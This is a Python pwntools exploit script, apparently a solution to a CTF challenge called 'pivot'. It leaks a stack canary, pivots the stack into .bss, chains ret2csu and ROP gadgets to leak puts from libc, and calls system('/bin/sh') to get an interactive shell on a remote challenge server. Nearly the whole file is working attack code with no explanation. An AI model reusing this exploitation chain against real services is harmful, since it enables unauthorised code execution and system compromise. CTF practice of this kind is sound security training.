from pwn import *
from LibcSearcher import *
from ae64 import AE64

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./pivot/pivot"
libc_addr = "./pivot/libc.so.6"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 21670
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x401320


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(edi)  # r12
    payload += p64(rsi)  # r13
    payload += p64(rdx)  # r14
    payload += p64(r12)  # r15
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
bss_addr = 0x404800
lev_ret = 0x0000000000401213
rdi_addr = 0x0000000000401343
ret_addr = 0x000000000040101A
vuln_addr = 0x4011D2

payload = b"a" * 0x28 + b"|"
p.sendafter(b"Name:", payload)

p.recvuntil(b"|")

canary = u64(p.recv(7).ljust(8, b"\0")) << 8
ls(canary)

dbg(p)

payload = b"a" * 0x108
payload += p64(canary)
payload += p64(bss_addr)
payload += p64(vuln_addr)
p.send(payload)

puts_plt = elf.plt.puts
puts_got = elf.got.puts
read_got = elf.got.read

payload = p64(0)
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(puts_plt)
payload += csu(edi=0, rsi=0x404790, rdx=0x100, r12=read_got)
payload = payload.ljust(0x108, b"i")
payload += p64(canary)
payload += p64(bss_addr - 0x110)
payload += p64(lev_ret)
p.sendafter(b".\n", payload)

p.recvuntil(b".\n")
puts_addr = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0"))
sys, sh = search_from_libc("puts", puts_addr)

payload = p64(ret_addr)
payload = p64(rdi_addr)
payload += p64(sh)
payload += p64(sys)
p.send(payload)


p.interactive()
